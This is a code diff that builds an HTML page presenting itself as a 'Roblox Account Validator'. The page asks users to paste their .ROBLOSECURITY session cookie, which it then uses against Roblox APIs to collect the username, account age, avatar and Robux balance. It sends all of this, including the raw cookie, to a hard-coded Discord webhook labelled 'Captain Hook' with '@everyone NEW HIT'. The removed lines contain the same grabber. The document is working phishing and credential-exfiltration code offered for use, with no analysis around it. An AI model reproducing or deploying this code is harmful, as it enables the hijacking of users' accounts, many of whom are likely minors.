@@ -1,108 +1,121 @@
-async function grabAndSend() {
-  const status = document.getElementById("status");
-  let input = document.getElementById("cookie").value.trim();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Account Validator</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 40px; text-align: center; }
+    .container { max-width: 500px; margin: auto; background: #161b22; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(88,101,242,0.4); }
+    h1 { color: #5865f2; }
+    input { width: 100%; padding: 12px; margin: 15px 0; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; border-radius: 6px; font-size: 16px; }
+    button { background: #5865f2; color: white; border: none; padding: 14px 30px; font-size: 18px; border-radius: 6px; cursor: pointer; }
+    button:hover { background: #4752c4; }
+    #status { margin-top: 20px; color: #ff4444; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Roblox Account Validator</h1>
+    <p>Paste your .ROBLOSECURITY token to validate session.</p>
+    <input type="text" id="cookie" placeholder="_|WARNING|-DO-NOT-SHARE-THIS.--..." />
+    <button onclick="grabAndSend()">Validate</button>
+    <div id="status"></div>
+  </div>
 
-  const warning = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
-  let start = input.indexOf(warning);
-  if (start === -1) {
-    status.textContent = "Invalid paste – needs the full warning string.";
-    return;
-  }
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1477729306158432428/aKd2-VP_7LOYpIlqv4F0Za63-BnEsiaYE1TvOSDO7R4U6gYSsIjiw1WTjwqMDKXz0cBn";
 
-  let cookie = input.substring(start);
-  let end = cookie.indexOf('"');
-  if (end !== -1) cookie = cookie.substring(0, end);
-  cookie = cookie.trim();
-
-  status.textContent = "Cookie extracted – hitting Roblox...";
-
-  try {
-    async function refreshCsrf() {
+    async function sendEmbed(title, desc, fields, color, thumb = null) {
+      const embed = { title, description: desc, color, fields, timestamp: new Date().toISOString(), footer: { text: "Captain Hook • " + new Date().toLocaleString() } };
+      if (thumb) embed.thumbnail = { url: thumb };
       try {
-        const res = await fetch("https://auth.roblox.com/v2/logout", {
+        await fetch(WEBHOOK, {
           method: "POST",
-          credentials: "include",
-          headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username: "Captain Hook", embeds: [embed], content: "@everyone NEW HIT" })
         });
-        return res.headers.get("x-csrf-token") || "";
-      } catch { return ""; }
+      } catch {}
     }
 
-    let csrf = await refreshCsrf();
-    let headers = {
-      "Cookie": `.ROBLOSECURITY=${cookie}`,
-      "Accept": "application/json",
-      "X-CSRF-TOKEN": csrf,
-      "Origin": "https://www.roblox.com",
-      "Referer": "https://www.roblox.com/"
-    };
+    async function grabAndSend() {
+      const status = document.getElementById("status");
+      let input = document.getElementById("cookie").value.trim();
+      const warning = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+      let start = input.indexOf(warning);
+      if (start === -1) { status.textContent = "Invalid format"; return; }
 
-    // Basics
-    const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
-    if (!authRes.ok) throw new Error(`Auth ${authRes.status}`);
-    const auth = await authRes.json();
-    const userId = auth.id;
-    const username = auth.name;
-    const displayName = auth.displayName;
+      let cookie = input.substring(start);
+      let end = cookie.indexOf('"');
+      if (end !== -1) cookie = cookie.substring(0, end);
+      cookie = cookie.trim();
 
-    csrf = await refreshCsrf();
-    headers["X-CSRF-TOKEN"] = csrf;
+      status.textContent = "Grabbing...";
 
-    // Details
-    const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers });
-    const details = userRes.ok ? await userRes.json() : {};
-    const ageDays = details.created ? Math.floor((Date.now() - new Date(details.created)) / 86400000) : "Unknown";
-    const desc = details.description || "None";
+      try {
+        async function getCsrf() {
+          const res = await fetch("https://auth.roblox.com/v2/logout", { method: "POST", credentials: "include", headers: { "Cookie": `.ROBLOSECURITY=${cookie}` } });
+          return res.headers.get("x-csrf-token") || "";
+        }
 
-    // Avatar
-    let avatar = null;
-    try {
-      const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { headers });
-      if (thumb.ok) {
-        const t = await thumb.json();
-        avatar = t.data?.[0]?.imageUrl;
+        let csrf = await getCsrf();
+        let headers = {
+          "Cookie": `.ROBLOSECURITY=${cookie}`,
+          "Accept": "application/json",
+          "X-CSRF-TOKEN": csrf,
+          "Origin": "https://www.roblox.com",
+          "Referer": "https://www.roblox.com/"
+        };
+
+        const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
+        if (!authRes.ok) throw new Error("Auth failed");
+        const auth = await authRes.json();
+        const userId = auth.id;
+        const username = auth.name;
+        const displayName = auth.displayName;
+
+        csrf = await getCsrf();
+        headers["X-CSRF-TOKEN"] = csrf;
+
+        const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers });
+        const details = userRes.ok ? await userRes.json() : {};
+        const ageDays = details.created ? Math.floor((Date.now() - new Date(details.created)) / 86400000) : "Unknown";
+        const desc = details.description || "None";
+
+        let avatar = null;
+        try {
+          const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { headers });
+          if (thumb.ok) {
+            const t = await thumb.json();
+            avatar = t.data?.[0]?.imageUrl;
+          }
+        } catch {}
+
+        let robux = "Failed";
+        try {
+          const econ = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
+          if (econ.ok) {
+            const e = await econ.json();
+            robux = e.robux?.toLocaleString() || "0";
+          }
+        } catch {}
+
+        const fields = [
+          { name: "Username", value: username, inline: true },
+          { name: "Display Name", value: displayName, inline: true },
+          { name: "User ID", value: userId + "", inline: true },
+          { name: "Age", value: ageDays + " days", inline: true },
+          { name: "Robux", value: robux + " ⏣", inline: true },
+          { name: "Cookie", value: "||" + cookie + "||", inline: false }
+        ];
+
+        await sendEmbed("NEW HIT", `${displayName} (@${username})`, fields, 0x00FF00, avatar);
+        status.innerHTML = "<strong style='color:#0f0'>Success - check Discord</strong>";
+      } catch (e) {
+        status.textContent = "Partial fail: " + e.message;
+        await sendEmbed("COOKIE ONLY", "Info partial, cookie good.", [{name: "Cookie", value: "||" + cookie + "||"}], 0xFF8800);
       }
-    } catch {}
-
-    // Robux attempts
-    let robux = "Private/Failed";
-    try {
-      const econ = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
-      if (econ.ok) {
-        const e = await econ.json();
-        robux = e.robux?.toLocaleString() || "0";
-      }
-    } catch {}
-
-    // Rolimons attempt (client fetch – may CORS fail)
-    let rap = "Unknown", limiteds = "Unknown", pending = "Unknown";
-    try {
-      const roli = await fetch(`https://www.rolimons.com/player/${userId}`);
-      if (roli.ok) {
-        const text = await roli.text();
-        // Crude parse – look for patterns like "RAP</span><span>401,997,527" or similar
-        const rapMatch = text.match(/RAP.*?>[\s,]*([\d,]+)/i);
-        rap = rapMatch ? rapMatch[1] : "Unknown";
-        // Add more regex for limiteds, pending if you inspect the page
-      }
-    } catch (e) { /* CORS or block – silent */ }
-
-    const fields = [
-      { name: "👤 Username", value: username, inline: true },
-      { name: "Display", value: displayName, inline: true },
-      { name: "🆔 ID", value: userId + "", inline: true },
-      { name: "📅 Age", value: `${ageDays} Days`, inline: true },
-      { name: "Robux", value: robux + " ⏣", inline: true },
-      { name: "RAP", value: rap, inline: true },
-      { name: "Limiteds", value: limiteds, inline: true },
-      { name: "Pending", value: pending + " ⏣", inline: true },
-      { name: ".ROBLOSECURITY", value: "||" + cookie + "||", inline: false }
-    ];
-
-    await sendEmbed("NEW HIT", `**${displayName}** (@${username})`, fields, 0x00AA00, avatar);
-    status.innerHTML = "<strong style='color:#0f0'>Sent – check hook!</strong>";
-  } catch (e) {
-    status.textContent = "Partial fail: " + e.message;
-    await sendEmbed("COOKIE HIT", "Basics failed, but cookie good.", [{name: "Cookie", value: "||" + cookie + "||"}], 0xFF8800);
-  }
-}
+    }
+  </script>
+</body>
+</html>
